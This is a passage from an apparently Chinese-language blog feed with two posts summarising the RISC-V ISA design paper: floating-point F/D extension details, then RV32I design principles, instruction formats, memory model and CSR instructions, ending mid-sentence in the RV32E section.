canonical NaN 是唯一的一个不能从 signaling NaN 转为 quiet NaN 的 quiet NaN 。 因此，对于可传播 NaN 的系统而言，刚生成的 NaN 可以与传播的 signaling NaN 相区别</li><li>清除 MSB 比设置 MSB 硬件成本更低。一些功能单元已经需要一个数据路径来提供尾数中的 0，但没有相应的数据路径来提供所有的 1</li></ul><p>IEEE 754 标准还提供了将 NaN 有效负载（即非 MSB 的尾数位）从 NaN 产生开始传播到输出操作的选项。该特性旨在保存诊断信息，例如 NaN 的起源。但出于三个原因，RISC-V 不提供这个特性：</p><ul><li>NaN 有效负载太小，无法保存完整的内存地址，因此很难使用该特性对有意义的诊断信息进行编码</li><li>因为在标准中 NaN 有效负载传播是可选的，所以可移植软件大都不依赖该特性，因此该特性很少被使用</li><li>传播 NaN 有效负载会增加硬件成本</li></ul><p><u>相对于的，当一条计算指令发出 NaN 时，我们要求它是 canonical NaN 即可</u>。当然，实现可以自由地将 NaN 有效负载传播方案作为非标准的扩展提供，由非标准处理器模式位启用，不过我们的默认方案仍然是强制性的。</p><h3 id="浮点指令">浮点指令</h3><center>    <img src="/img/RV32F.png" /></center><p>上图列出了 30 条 <strong>RISC-V F</strong> 扩展的新指令。它们分为四类：数据移动指令，转换指令，比较指令和算术指令。数据移动指令中，有新的 loads 和 stores 指令，FLW 和 FSW ，它们负责数据在内存和浮点寄存器之间移动，还包括了数据在浮点寄存器和整数寄存器之间移动的指令，FMV.X.S 和 FMV.S.X 。有些 ISAs 比如 SPARC 和 最初的 Alpha ，省去了这些指令，用一个临时内存来代替实现这一功能。这种设计消除了流水线冒险，但却大大增加混合格式代码长度。下面的代码块就证明了这点。没有 FMV.X 等指令，就要多 60% 的指令，并可能会导致数据缓存未命中，降低性能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nasm">fmv.x.s a0, fa0 addi sp, sp, -16<br>srli a0, a0, 23 fsw fa0, 0(sp)<br>andi a0, a0, 0xff lw a0, 0(sp)<br>addi a0, a0, -127 srli a0, a0, 23<br>jalr x0, ra, 0 andi a0, a0, 0xff<br>addi a0, a0, -127<br>addi sp, sp, 16<br>jalr x0, ra, 0<br><br>;WITH FMV.X.S WITHOUT FMV.X.S<br></code></pre></td></tr></table></figure><p><strong>F</strong> 指令的一个新特点是符号注入指令（sign-injection instruction）。FSGNJ 、FSGNJN 和 FSGNJX 指令。它们会得到一个从 <code>rs1</code> 中取出的除符号位之外所有位的结果。对于 FSGNJ，结果的符号位为 <code>rs2</code> 的符号位；对于 FSGNJN，结果的符号位与 <code>rs2</code> 的符号位相反；FSGNJX 的符号位是 <code>rs1</code> 和 <code>rs2</code> 寄存器符号位的异或值。当两个源操作数相同时，这些指令可用于移动、取反或取绝对值。更通常的情况下，它们对于手工编写的浮点库例程很有用。</p><p>转换指令负责完成整数与浮点数的转换。凡是要用到整数的地方都用整数寄存器，这可以提高混合形式代码的性能，因为这显式地减少了两组寄存器之间的移动。不在浮点寄存器中表示整数可以简化内部重编码浮点格式的实现。四条转换指令有：转换到有符号整数（FCVT.W.S 和 FCVT.S.W）和无符号整数（FCVT.WU.S 和 FCVT.S.WU），并支持任何舍入模式。</p><p>比较指令会得到一个相等或不等测试的布尔结果，并将布尔值写入 <code>rd</code> 寄存器。FEQ.S 比较了两个浮点数是否相等；FLT.S 比较 <code>rs1</code> 是否小于 <code>rs2</code> ；FLE.S 比较 <code>rs1</code> 是否小于等于 <code>rs2</code> ；当其中一个源操作数为 NaN 时，结果总是 false 。FLT 和 FLE 在 quiet NaN 下会抛出了一个无效的异常，就像 C 中 &lt; 和 &lt;= ；FEQ 则没有，和 C 中 == 一样。若要在浮点比较的结果上进行分支，则需要 BEQ 或 BNE。</p><p>另外两个比较指令是 FMIN.S 和 FMAX.S，分别计算两个浮点数的最小值和最大值。他们实现 IEEE 754 中规定的 <em>minNum</em> 和 <em>maxNum</em>，且不传播 NaN：若一个输入是 NaN，则返回另一个输入。 FMIN 的行为与 C 库的 fminf 相同。不过，它不符合常见的（a &lt; b ? a : b），因为如果 a 或 b 是 NaN ，它的值总是 a。</p><p>最后介绍的浮点数比较指令是浮点分类指令，FCLASS.S 查看浮点数寄存器 <code>rs1</code> 的值，然后向整数寄存器 <code>rd</code> 写一个 10-bit 的掩码，用以区分该浮点数的类别。下表列出了对应位与相应类之间的关系。注意，掩码都是独热码（one-hot encode），所以使用一条 ANDI 指令就可以检测出多个类别</p><table><thead><tr><th>rd bit</th><th>Meaning</th></tr></thead><tbody><tr><td>0</td><td><code>rs1</code> is -∞</td></tr><tr><td>1</td><td><code>rs1</code> is a negative normal number</td></tr><tr><td>2</td><td><code>rs1</code> is a negative subnormal number</td></tr><tr><td>3</td><td><code>rs1</code> is −0</td></tr><tr><td>4</td><td><code>rs1</code> is +0</td></tr><tr><td>5</td><td><code>rs1</code> is a positive subnormal number</td></tr><tr><td>6</td><td><code>rs1</code> is a positive normal number.</td></tr><tr><td>7</td><td><code>rs1</code> is +∞.</td></tr><tr><td>8</td><td><code>rs1</code> is a signaling NaN.</td></tr><tr><td>9</td><td><code>rs1</code> is a quiet NaN</td></tr></tbody></table><p>FCLASS 指令对于手工编写的库例程很有用，因为它们通常会在不寻常的输入上进行分支，比如 NaNs。而若不适用 FCLASS ，则将数字移动到整数寄存器中，并解析其组成字段的办法需要更多的指令。</p><p>运算指令包含：加法、减法、乘法、除法、开根运算。为了合理高效地支持 IEEE 754-2008 ，<strong>RISC-V F</strong> 还提供了 4 条混合乘加的指令 FMA，用于计算 <code>±a×b±c</code> 四种操作中的任何一种，且不需要中间的乘积舍入。这个性质可以加快一些浮点库例程的实现，并且通常可以提高许多算法的性能和准确性。对于一些浮点加法和乘法出现次数特定的程序，与仅使用乘法和加法的体系结构相比，使用 FMA 指令能大大减少实现高吞吐量所必需的工作。例如，考虑存储在内存中的 4×4 矩阵的密集线性代数运算 <code>C += A×B</code> 。若没有 FMA，这个操作需要 192 条指令，包括 272 个浮点寄存器读和 176 个写。使用 FMA ，它需要 128 条指令，包括 208 个读和 112 个写——指令数量减少了 33%，操作数量减少了 29% 。</p><h2 id="双精度浮点运算">双精度浮点运算</h2><p>大多数通用系统都需要单精度和双精度浮点数，主要是因为单精度对于某些算法来说不够精确，还因为现代编程语言对双精度运算有偏见。<u>然而，我们认为最好还是将 <strong>RISC-V F</strong> 与 <strong>RISC-V D</strong> 分开，因为在有些嵌入式领域，单精度浮点数就足够了，双精度就太昂贵了</u>。主流的 ARM Cortex-M4 ，一个 32 位的微控制器，以及无数的数字信号处理器都体现了这点。</p><center><img src="/img/RV64D.png" /></center><p><strong>D</strong> 扩展的结构与 <strong>F</strong> 扩展非常相似，当然 <strong>F</strong> 扩展也有存在的必要。浮点寄存器的位宽变为了 64 位，且增加了对双精度数值进行操作的新指令。32 位和 64 位浮点数不能在计算指令中自由混合，但是在格式之间转换的指令（FCVT.D.S 和 FCVT.S.D），可以支持混合格式代码。</p><p>我们曾设想了另一种设计：寄存器仍为 32 位宽，双精度值对齐地存储在寄存器对中，就像在 SPARC 和 MIPS 一样。然而，这种设计不太适合寄存器重命名的实现，因为寄存器重命名会导致值的两半可能在物理上不再相邻。更重要的是，这种设计将使可用于双精度程序的寄存器数量减半，会导致寄存器阻塞，并增加指令数量。扩大寄存器的位宽似乎是最好的选择，尽管会带来额外的硬件资源消耗。</p><p>需要注意的是，在 RV32 中没有将双精度浮点数与整数寄存器文件来回移动的东西。事实上，我们曾考虑增加三条指令：FMVHI.X.D 和 FMVLO.X.D 分别用于拷贝高位/低位的浮点数值到整数寄存器，而 FMV.D.X 用于将两个整数寄存器中的数值转换为一个双精度浮点数，并将浮点数存入浮点寄存器。但是 FMV.D.X 是唯一具有两个整数源的浮点指令，所以我们认为最好完全放弃对这些操作的支持，而改用临时内存。但 RV32D 仍然支持更常见的整数数据类型转换。</p>]]></content>
    
    
    <categories>
      
      <category>RISC-V</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RISC-V</tag>
      
      <tag>RISC-V F</tag>
      
      <tag>RISC-V M</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Why RISC-V ?</title>
    <link href="/2020/09/17/2020-9-17-WHY%20RISC-V%202/"/>
    <url>/2020/09/17/2020-9-17-WHY%20RISC-V%202/</url>
    
    <content type="html"><![CDATA[<h1>Why RISC-V ?</h1><p>读 <a href="https://people.eecs.berkeley.edu/~krste/papers/EECS-2016-1.pdf">Design of the RISC-V ISA</a> 论文后的总结与思考。这是本系列的第二部分，在调研了当代主要的 ISAs 后，作者认为现有 ISAs 不适合研究和教育目的，并因此设计了 RISC-V 。接下来我会继续研读这篇论文，细细体会这样设计带来的好处。</p><h2 id="Why-call-it-RISC-V">Why call it RISC-V</h2><p>既然是全新的 ISA，为何其名字中有 V (five 罗马数字) ？这是因为，RISC-V 在 <a href="http://web.cecs.pdx.edu/~alaa/ece587/papers/patterson_isca_1981.pdf">RISC-I</a> 、<a href="https://dl.acm.org/doi/10.5555/2334.2336">RISC-II</a> 、<a href="https://www2.eecs.berkeley.edu/Pubs/TechRpts/1985/5940.html">SOAR</a> 和<a href="https://ieeexplore.ieee.org/document/1663096">SPUR</a> 项目的基础上，是加州大学伯克利分校的第五项 RISC ISA 的设计成果，因此我们将其命名为 RISC-V。还有一点原因是设计人员期望新的 ISA 可以很好地支持并行，V 也有 “Vector” 的含义。</p><h2 id="设计原则">设计原则</h2><p>RISC-V ISA 总体的设计目标是什么？一句话概括，<strong>RISC-V ISA 要适用于几乎任何计算设备</strong>。这一目标带来了两个直观的结果：</p><ol><li><strong>RISC-V 不能针对任何特定的架构进行设计</strong>，这是因为在某些体系结构上带来的好处可能在别的地方会花费非常大的代价。之前讨论的主流架构中，之所以有非常多缺点，是因为架构师做出了对原先的实现过度优化的决策（例如，MIPS 的延迟分支和 SPARC 的条件码）。避免“架构技术”在 RISC-V 设计中的影响，因为它只会给 RISC-V 的实现带来很小的好处，却给其他实现带来不必要的损失。</li><li>更重要的一点是，为了使 RISC-V 无处不在，<strong>RISC-V ISA 必须 open and free</strong>。开放标准的好处是多方面的，最重要的可能就是大量处理器实现；免费、开源将降低构建新系统的成本，它们与商业专营的实现的竞争将刺激微体系结构的创新；因为开放的实现可以提供第二种选择，对知识产权供应商垄断的担忧得到了缓解；如果采用同一标准和实现，那么学术界和工业界交流的障碍就会降低；开放的标准也可以改进一系列安全问题：商业间谍、爱干涉的政府等影响都会减弱 <code>:)</code>。</li></ol><p>之前说的目标过于笼统，在定义 RISC-V 前，应当有一个更加细化的特定技术目标：</p><ul><li><em>将 ISA 分为小而基础的 base ISA 和可选扩展 ISA</em> 。其中 base ISA 应当尽量小，适合教育和许多嵌入式处理器，但它必须足够完整，可以运行一个现代软件堆栈。扩展 ISA 可提高了计算工作性能，提供多进程的支持</li><li><em>同时支持 32 bit 和 64 bit</em> ，因为 32 bit 更适合在小系统中使用，同时，还要预留给未来 128 位的机器</li><li><em>考虑自定义 ISA 扩展</em>，提供包括紧密耦合的功能单元和松散耦合的协处理器单元</li><li><em>支持变长指令集</em>，以提高代码密度，扩展自定义 ISA 的编码空间。</li><li><em>给现代标准提供便利的硬件支持</em>，包括 IEEE-754 2008 中规定的浮点数运算标准，以及 C11 和 C++11 等编程语言。</li><li><em>严格正交化用户级与特权级的 ISA</em> ，即严格分离用户级与特权级，并做到完全支持可虚拟化。支持在特权 ISA 下的实验，同时能维护用户应用程序 ABI 的兼容性。</li></ul><p>回顾一下 RISC-V 这几年的发展，博主认为这些具体目标都得到了很好的实现，这也是 RISC-V 目前在体系结构领域非常流行的原因之一。</p><p>接下来，我会介绍一下 base ISA—— RV32I RV64I 和 RV32E，它们虽然是不同东西，但设计十分相近。RV32I 和 RV64I 仅在寄存器长度和内存地址空间不同，RV32E 是 RV32I 的变种，只不过有更少的寄存器，它专门为嵌入式系统设计。</p><h2 id="RV32I">RV32I</h2><p>RV32I 是 32 位整数 ISA 。它是非常简单，仅由 47 条指令组成，但它已经足够完整，足以形成一个编译目标，满足现代操作系统和运行时的基本要求。其中 8 条指令是系统指令（系统调用和性能计数）。</p><p>和许多 RISC 指令集一样，其余的指令分为三类：运算，控制，内存访问。RISC-V 是一种 load-store 架构，算术指令只在寄存器上操作，只能使用 load 和 store 向存储器或从存储器传输数据。</p><p>如下图，在 RV32I 中有 31 个通用整数寄存器，命名为 <code>x1</code> - <code>x31</code>，每个寄存器的宽度为 32 位。寄存器 <code>x0</code>  恒为 0；<code>x0</code> 可以被用作废弃指令结果的目标寄存器。唯一的附加寄存器是程序计数器，<code>PC</code>，它保存当前指令的地址。</p><center>    <img src="/img/RV32I_reg.png" /></center><p>RV32I 中的指令有 32 位长，且以<strong>小端字节</strong>的顺序在内存中对齐存储。我们之所以这么做，是因为当前在通用计算中占主导地位的 x86 是小端法，且小端法软件更常见，虽然大多数软件都是兼容的😓。ISA 有六种指令格式组成：四种主要格式，<strong>R</strong>, <strong>I</strong>, <strong>S</strong>, <strong>U</strong>；还有两个变体 <strong>SB</strong> 和 <strong>UJ</strong>，除了直接操作数编码外，它们与 S 和 U 完全相同。指令中的两个源操作数寄存器分别被标识为 <code>rs1</code> 和 <code>rs2</code> ，输出结果的目的寄存器被标识为 <code>rd</code> 。<u>这样编码的一个重要特性是，当这些寄存器被用到时，它们在指令中的位置始终相同，这就允许寄存器获取与指令解码并行执行，改善了许多实现中的关键路径</u>。</p><center>    <img src="/img/RV32I_formats.png" /></center><p><u>该编码方案的另一个特性是，从指令中生成立即操作数的成本很低</u>。在一个 32 位的立即数中，有 7 位总是来自指令中的相同位置（imm[10:5]），包括符号位，由于它们是最经常用到的，因而是最关键的。另外 24 位来自于两个地方，因此最终的立即数有三处来源。对于 SB 和 UJ 格式，它们的立即数一定会被 2 整除，立即数是通过旋转拼接而成的，而不是像 MIPS、SPARC 和 Alpha 一样使用多路选择器。这种设计降低了重用 ALU 数据路径来计算分支目标的硬件成本。</p><p><a href="https://www.cnblogs.com/mikewolf2002/p/11196680.html">这篇博客</a>描述了 RV32I 的主操作码的分配情况。主操作码 7 位宽，但在 base ISAs 中，末两位都是 11 ，也就是说一共可编码 32 条指令。这意味着我们留出了 3/4 的编码空间给扩展 ISA ，这可以显著提升代码密度。 在这可编码的 32 条指令中，RV32I 花了 11 个，其他 base ISAs 花了 4 个，标准扩展花了 8 个，另外剩下 9 个仍用于 ISA 扩展。</p><h3 id="运算指令">运算指令</h3><p>RV32I 有 21 个运算指令，包括算数、逻辑、比较。这些指令都是在整数寄存器上运算；有些指令会带上立即数。运算指令可以对有符号整数和无符号整数进行操作。有符号整数使用两者的补码表示。<u>所有的立即操作数都是符号扩展的</u>，即使是在立即数表示无符号量的上下文中也是如此。<u>这样可以降低 ISA 的描述复杂性，在某些情况下实际上会带来更好的性能</u>（MIPS 会零扩展某些立即数，比如逻辑运算中的立即数，但这有时额外需要一条屏蔽寄存器有效位的指令）。</p><p>具体来说，运算指令的操作有加法、减法和移位。R-type 指令 ADD 和 SUB 分别用于加法、减法，将 <code>rs1</code> 和 <code>rs2</code> 中的值加/减得到结果，存回到 <code>rd</code> 寄存器中。SLL 、SRL 和 SRA 根据 <code>rs2</code> 寄存器中最低 5 位的值来分别进行逻辑左移、逻辑右移和算术右移 <code>rs1</code> 中的值。I-type 指令有 ADDI 、SLLI 、SRLI 和 SRAI 功能相同，只不过把 <code>rs2</code> 寄存器的值换成了立即数。注意到没有 SUBI 指令，因为 ADDI + 负立即数就可以其同样的作用。</p><p>逻辑运算主要是布尔运算。AND 、OR 和 XOR 分别将寄存器 <code>rs1</code> 和 <code>rs2</code> 的值进行与/或/异或，得到的值写回寄存器 <code>rd</code> 。ANDI 、ORI 和 XORI 使用了立即数做了相同的事情。由于立即数是符号扩展的，RISC-V 为实现位反转，即 NOT，就可用 XORI + 立即数 -1。相比之下，MIPS 的零扩展可提供额外的指令 NOR，不过 NOR 很少使用🙃。</p><p>比较操作 SLT 和 SLTU 分别有符号/无符号地比较 <code>rs1</code> 的值是否小于 <code>rs2</code> 的值，并将布尔值写回到寄存器 <code>rd</code> 。SLTI 和 SLTIU 使用立即数做了相同的事情。为实现 SEQZ 和 SNEZ（判断等于 0 /不等于 0），RISC-V 使用 SLTIU + 立即数 1 来判断 <code>rs1</code> 是否等于 0 ；使用 SLTU + <code>rs1</code> = <code>x0</code> 来判断 <code>rs2</code> 是否不等于 0 。</p><p>最后，RV32I 提供了两个特殊的 U-type 运算指令。LUI (load upper immediate) 将寄存器 <code>rd</code> 的值的高 20 位赋为立即数，而低 12 位 为 0 。LUI 主要与 ADDI 一起，将任意的 32 位常量加载到寄存器中，也可以与load store 指令一起作用，访问任何静态 32 位地址，或与间接跳转指令一起将控制转移到任何静态 32 位地址。另一个是 AUIPC (add upper immediate to pc) ，它将 <code>PC</code> 的高 20 位加一个立即数，并将结果写入寄存器 <code>rd</code>。<u>AUIPC 构建了 RISC-V 的 PC 相对寻址方案：在 PIC 中，这对控制代码大小和性能至关重要</u>。</p><h3 id="内存访问指令">内存访问指令</h3><p>RV32I 中，有五条指令将数值从内存加载到整数寄存器中，三条指令将数值存储到内存中。所有这些指令都使用字节地址来标识内存位置；字节地址是通过将 <code>rs1</code> 的值加上立即数得到的。</p><p>我们曾考虑支持其他寻址模式，包括索引寻址，即 <code>rs1</code> + <code>rs2</code>。但这将需要增加第三个源操作数 <code>rs3</code> 用于记录存入的数值。类似地，虽然自动递增的寻址模式可减少动态指令数量，但在指令中会增加第二个目标操作数 <code>rd2</code> 用于记录已经增加的偏移量。当然，我们可以采用一种混合的方法，仅为某些指令提供索引寻址，为其他指令提供自动增量，就像Intel i860 一样，但是我们认为这些额外的指令和非正交性使 ISA 复杂化了。此外，我们注意到，循环展开对动态指令数量的减少幅度是最大的，这对高性能代码来说都是个好消息（言外之意是，循环展开可以减少很多动态指令数量，不需要再增加以上提到的寻址模式，这可能会导致陷入过度优化的陷阱中）。</p><p><u>非对齐 load store 是显式允许的，但注意到，它们不能保证被原子地执行或者高性能</u>。这条“规定”允许一些简单的实现 trap 这些指令，并通过非原子地操作相邻的字来模拟低级系统软件中的非对齐访问，但也给高性能系统保留了在硬件中实现非对齐访问的灵活性。其他 ISAs 对这个问题的处理完全不同，x86 要求非对齐的访问必须原子地执行，将非对齐访问委托给硬件实现，这会使硬件设计非常复杂。MIPS 和 Alpha 都将非对齐 load store 定义为非法，但额外提供了处理非对齐情况的指令。这些指令会占用了大量的编码空间，对于 MIPS ，还增加了新的流水线冒险。<u>我们认为，简单地允许非对齐的访问，但给实现留下很大的灵活性，是一个更好的 tradeoff</u> 。</p><p>load 指令都使用了 I-type 形式。LW 指令将操作 32 bit ，LH 和 LB 分别操作 16 bit 和 8 bit ，并将数值放到 <code>rd</code> 的最低位部分，并符号扩展填充整个 <code>rd</code> 。类似地，LHU 和 LBU 也这么干，只不过最后是零扩展填充整个 <code>rd</code> 。store 指令都使用了 S-type 形式。SW 指令将操作 32 bit ，SH 和 SB 分别操作 16 bit 和 8 bit ，它们将<code> rs2</code> 的值的最低位部分存到内存的半字/字节中。</p><h3 id="内存访问顺序"><a href="https://www.cs.utexas.edu/~bornholt/post/memory-models.html">内存访问顺序</a></h3><p>一个 RISC-V 的线程在执行时，它对自己的所有 load store 都是可见的，且是顺序发生的，但是在多线程环境中，我们不保证一个线程可见到另一个线程的内存访问。这个设计就是 relaxed memory model 。不得不承认，像 RISC-V 这样的 weak memory model 比 <a href="https://jepsen.io/consistency/models/sequential">sequential consistency</a> (SC) 少了点直观性。因为 SC 规定“内存存入操作总是对所有线程可见，且内存访问顺序按程序指定的顺序执行”，给人的感觉更加合理直观。但是 SC 实际上不允许一些重要的内存系统优化，比如非阻塞 load 和带有旁路的写缓冲。</p><p>我们观察到，很少有违反内存顺序的行为会被其他线程看到，乱序微体系结构可以推测出对内存访问的重排序是安全的，并且也可以做到若有线程注意到了重排序，就丢弃这个不正确的重排序。实际上，乱序微体系结构可以重用他们现有的推测机制来提供一个看起来像 SC ，但性能更接近 relax memory 的模型。遗憾的是，这种技术并不适用于简单、有序的微体系结构实现，因为它们不能装上这种昂贵的推测执行硬件。因此，若选择 SC 作为我们的内存访问模型，会过分地降低这些简单实现的性能。</p><p><u>由于我们采取了 relax memory model 。因此强制地整理内存顺序变得显而易见的重要</u>。RV32I 提供了一个 FENCE 指令，给 FENCE 之前和之后的内存访问提供顺序保证。它参数有两个集合，即 <em>predecessor</em> 集合和 <em>successor</em> 集合，它们指示栅栏对哪种类型的访问进行排序：内存读取®、内存写入(W)、设备输入(I)和设备输出(O)。例如，<code>fence rw,w</code> 指令保证了在 fence 之前所有 load 和 store 操作都不会出现在 fence 之后的任何 store 前。</p><p>RV32I 还提供了一条指令来同步指令流和数据访问，称为 FENCE.I 。对指令内存的 store 只保证在执行 FENCE.I 之后的后续指令 fetch 中反映出来。一些架构，如 x86 ，对 store 和 instruction fetch 提供了更强的保证。对于那些将指令 cache 和数据 cache 分开的系统，x86 要求这两个缓存保持一致。不过由于在运行中自我修改代码的情况实属罕见，我们认为最好的办法就是允许简单的实现使用不一致的指令 cache ，而把实现自我修改代码的任务，交给程序员，让他们用插入一条 FENCE.I 指令来完成。</p><h3 id="控制流指令">控制流指令</h3><p>RV32I 中有六条指令来有条件地更改控制流。这些使用 SB-type 格式的分支指令，在两个寄存器之间执行算术比较，然后将控制转移到 ±4 KiB (±1K 指令) 范围内的任何地方。新地址由符号扩展 12 位立即数加上当前 <code>PC</code> 形成。BEQ 比较 <code>rs1</code> 和 <code>rs2</code> 的值，在两值相等时分支跳转。BLT 有符号地比较 <code>rs1</code> 是否小于 <code>rs2</code> ，若为真则跳转，BLTU 则是无符号的。BNE 、BGE 和 BGEU 则分别是 <code>rs1</code> 和 <code>rs2</code> 是否不等/有符号大于/无符号大于。</p><p>在其他 RISC 体系结构中，一个分支指令的常见特性是<a href="https://blog.csdn.net/qq_42556934/article/details/106659053">分支延迟槽</a>。延迟槽指的是，在分支语句后，无论是否进行分支转移，紧接在其后的指令都将执行，以补充分支指令后流水线中出现的空槽。这一设计优化了层数较浅、单发射且顺序的流水线，分支跳转与否和后续指令的 fetch 会在一个周期内解决，因此延迟槽提高了流水线利用率，并消除了控制冒险。<u>然而，对于层次更深的流水线和具有超标量指令调度的微体系结构来说，延迟槽增加了复杂性却失去了好处</u>。事实上，它们甚至会降低性能：未填充的延迟槽必须用 NOP 填充，增加了代码大小。此外，现有的微体系结构技术可以保持流水线的繁忙，而不必在其上搞一个延迟槽：分支目标预测在通常情况下可以做到这一点。一个 2-entry 的分支目标缓冲区足以捕获大多数循环，只增加了大约 128 位的微体系结构状态，因此对于大多数流水线实现来说是很合理的。</p><p>此外，为了在流水线的早期解决分支（这样可以提高流水线利用率），许多 RISC 架构只提供简单的分支。例如，Alpha 只提供与 0 的比较，比较两个寄存器的值需要额外的指令。其他 ISAs，如 SPARC，通过只在条件代码寄存器上提供分支来实现这种效果。在这种情况下，就需要额外的指令来设置条件代码。在 RISC-V 中，<u>我们通过将比较合并到分支指令中，可以获得更小的代码和更少的动态指令数量</u>。对于流水线实现，这个决定可能会使得解决分支必须放在之后的流水线阶段中。<u>但考虑到现代流水线往往具有准确的分支预测和分支目标预测，因此这一决定带来的分支延迟增加的代价，会被动态指令数量的减少和代码大小的减少所抵消</u>。</p><p>我们有意识地忽略了对有条件移动和<a href="https://en.wikipedia.org/wiki/Predication_(computer_architecture)">预测</a>的支持。这两者都支持某种形式的 if-conversion，通过这种转换，可以用一些控制冒险交换数据冒险。有条件移动指令比预测弱得多：有条件移动指令在关键代码路径中，通常不能用于对可能导致异常（如 load store）的指令进行 if-convert。而预测更为通用，但会增加架构状态数量并消耗大量编码空间，因为我们必须为每条指令提供一个附加的预测操作码。这两种技术都使寄存器重命名的实现复杂化，因为当预测为假时，目标寄存器的旧值必须复制到新的寄存器上。最后，通常情况下，if-conversion 没有带来什么好处：分支预测将会胜出，有时具有更高的性能，因为它消除了额外的数据依赖。</p><p>除了分支语句，RISC-V 还提供了两个无条件跳转指令。UJ-type 的 JAL (jump and link) 指令，将 <code>PC</code> 设定到 ±1MiB 范围（±256K 指令），还将写入 JAL 后一个指令的地址，即 <code>PC</code> +4 到 <code>rd</code> 寄存器中。因此，该指令可用于函数调用，并让被调用者知道返回的地址。当不需要用到 <code>rd</code> 时（就像简单跳转），<code>x0</code> 可以当作 <code>rd</code>，我们加了一个伪指令 J 用来表示这一情况。当然，JAL 是 <code>PC</code> 相关的寻址，肯定可以使用 PIC 。</p><p>I-type 的指令 JALR 提供了间接跳转，其目的地址是 <code>rs1</code> 的值加上立即数。这个通用指令用于表跳转（在 C 的 switch 语句中），间接函数调用和函数返回。JALR 不需要计算地址的最末位（指令地址必然是两个字节对齐），并允许软件将数据放在这个位上，略微降低了硬件成本。与 JAL 一样，将 JALR 后一个指令的地址写入到寄存器 <code>rd</code> 中。</p><p>所有的 control-transfer 指令都具有两字节的粒度。这对 RV32I 没有什么用处，因为它所有的指令都是 4 字节对齐的，但是它支持指令集扩展—— RV32C 的长度可以是两个字节的任意倍数。RV32C 是压缩 ISA 扩展，它增加了 16 位指令，以提升代码密度。</p><h3 id="系统指令">系统指令</h3><p>RV32I 有 8 条系统指令。简单的实现可以选择 trap 这些指令，并在系统软件中模拟它们的功能，高性能的实现可在硬件中实现它们的更多功能。</p><p>ECALL 指令用于在操作系统中执行系统调用。RISC-V ISA 本身没有为系统调用定义参数传递规定；它是 ABI 的一个属性。大多数系统将参数传递给系统调用的方式与它们传递参数给普通函数调用的方式相同。</p><p>EBREAK 指令用于调用调试器。与许多 ISAs 不同，<u>RISC-V 不允许在 EBREAK 指令字中编码元数据</u>。这个特性会消耗额外的编码空间，但是并不是特别有用，因为字段的宽度不足以容纳一个完整的内存地址。相反，这些数据最好存储在一个辅助的数据结构中，由 EBREAK 指令的程序计数器索引。</p><p>还有六条指令都是用于读写控制与状态寄存器 (control and status registers) 的值，这些寄存器用于提供系统控制和 I/O 。CSR 地址空间支持最多 $ 2^{12}$ 个控制寄存器；现在，这些空间大部分都空着。CSRRW 指令将CSR 中的值复制到整数寄存器 <code>rd</code> 中，并将 <code>rs1</code> 的值自动覆盖到 CSR 寄存器中。CSRRC 指令原子地清除CSR 中的位。它复制 CSR 的旧值给 <code>rd</code>，然后对于寄存器 <code>rs1</code> 中设置的任何位，它会自动清除 CSR 中的相应位。CSRRS 指令与此类似，但它在 CSR 中设置位，而不是清除位。其余三个指令，CSRRWI 、CSRRCI 和 CSRRSI，它们的行为与没有 I 的对应指令类似，但是它们不是从寄存器 <code>rs1</code> 中获取源操作数，而是直接对一个 5 位立即数进行零扩展。</p><center><img src="/img/RV32I_CSR.png" /></center><p>由于读取或写入 CSR 都有副作用，因此我们定义了这些指令的两种特殊情况，每一种都显式地缺少其中一种副作用。用 CSRRS + <code>rs1</code> = <code>x0</code> 来读取 CSR 寄存器，但不设置任何位，失去了写副作用，这便是 CSRR 伪指令。用 CSRRW + <code>rd</code> = <code>x0</code> 来写入 CSR 寄存器，但旧值被丢弃，失去了读副作用，这就是 CSRW 伪指令。</p><table><thead><tr><th>Name</th><th>Meaning</th></tr></thead><tbody><tr><td>cycle</td><td>Cycle counter</td></tr><tr><td>time</td><td>Real-time clock</td></tr><tr><td>instret</td><td>Instructions retired counter</td></tr><tr><td>cycleh</td><td>Upper 32 bits of cycle counter</td></tr><tr><td>timeh</td><td>Upper 32 bits of real-time clock</td></tr><tr><td>instreth</td><td>Upper 32 bits of instructions retired counter</td></tr></tbody></table><blockquote><p>In the context “retired” means: the instruction (<a href="http://en.wikipedia.org/wiki/Micro-operation">microoperation</a>, μop) leaves the “Retirement Unit”. It means that in <a href="http://en.wikipedia.org/wiki/Out-of-order_execution">Out-of-order</a> CPU pipeline the instruction is finally executed and its results are correct and visible in the <a href="http://en.wikipedia.org/wiki/Architectural_state">architectural state</a> as if they execute in-order.</p></blockquote><p>在大多数系统中，大多数 CSR 只能由特权软件访问，但是 RV32I 要求一些用户级 CSR 提供基本的性能诊断工具。所有这些都是只读的，因此必须使用CSRR 伪指令进行访问。上表列出了它们。cycle counter 记录自参考时间以来经过的时钟周期数。instret counter 在指令已退出时滴答一次。time 寄存器记录了自启动计数以来的时间。<u>我们同时提供了 cycle 和 time，这都是有意义的，因为它们并不一定是线性相关的</u>。看到这里，你一定很惊讶。这是因为，当利用率和环境条件随时间变化时，许多处理器的实现使用动态电压和频率调节来调整性能和功耗，因此 time 对于基本性能测量是很有必要的。另一方面，cycle 对于判断处理器流水线的性能是必不可少的。</p><p>理想情况下，cycle 寄存器、instret 寄存器和 time 寄存器都是 64 位，因为 32 位计数器溢出很快：例如，在 4 GHz 的实现中，cycle 在大约一秒后溢出。相比之下，64 位计数器需要一个多世纪才能溢出，大概超过了处理器发生故障的平均时间😂。为了在 32 位 ISA 中使用 64 位计数器，我们提供了额外的 CSRs：cycleh 、instreth 和 timeh，它们包含相应计数器的上 32 位。当然，读取其中一个计数器的两半部分的行为不是原子性的，而且计数器可能会在序列中间溢出，特别是在发生中断时。</p><h2 id="RV32E">RV32E</h2><p>对于低端实现来说，RV32I 中规定的 31 个整数寄存器通常是昂贵的。虽然对于许多嵌入式场景来说，有大量寄存器的机器能提供过好的性能，因而从硬件成本的角度看，这是不合理的。使用更少的寄存器也会更节能，RV32E 就旨在满足这一领域的设计需求。</p><p>RV32I 和 RV32E 仅在整数寄存器的数量上有所不同：后者将数量减少到了 15 。图中描述了 RV32E 